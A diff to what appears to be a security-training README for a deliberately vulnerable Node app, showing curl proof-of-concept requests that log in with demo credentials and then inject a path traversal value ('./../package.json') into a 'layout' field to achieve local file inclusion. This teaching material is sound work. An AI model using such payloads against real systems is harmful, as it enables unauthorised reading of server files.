@@ -77,7 +77,11 @@ The form is completely functional. The way it works is, it receives the profile 
 You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:
 
 ```sh
-curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{"layout": "./../package.json"}' 'http://localhost:3001/account_details'
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
+```
+
+```sh
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
 ```
 
 Actually, there's even another vulnerability in this code.
